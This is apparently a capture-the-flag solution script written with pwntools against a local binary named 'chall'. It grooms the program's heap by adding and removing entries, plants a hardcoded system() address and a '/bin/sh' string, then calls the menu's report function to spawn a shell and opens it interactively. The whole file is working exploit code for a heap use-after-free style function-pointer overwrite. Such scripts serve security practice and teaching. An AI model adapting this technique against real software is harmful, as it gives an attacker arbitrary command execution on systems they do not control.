#!/usr/bin/python3
from pwn import process, p64

shell = process("./chall")

system = p64(0x401120)

def add(data):
    shell.sendlineafter(b"> ", b"1")
    shell.sendlineafter(b"> ", b"1")
    shell.sendlineafter(b"> ", data)
    shell.recvline_contains(b"[DEBUG]")

def remove(index):
    shell.sendlineafter(b"> ", b"2")
    shell.sendlineafter(b"> ", str(index).encode())
    shell.recvline_contains(b"[DEBUG]")

def report(index):
    shell.sendlineafter(b"> ", b"3")
    shell.sendlineafter(b"> ", str(index).encode())

add(b"A" * 8)
add(b"B" * 8)
add(b"C" * 8)
add(b"D" * 8)
add(b"E" * 8)

remove(0)
remove(1)
remove(2)
remove(3)
remove(4)

add(b"A" * 8)
add(b"B" * 8)
add(b"C" * 8)
add(system)
add(b"/bin/sh\x00")

report(4)

shell.interactive()
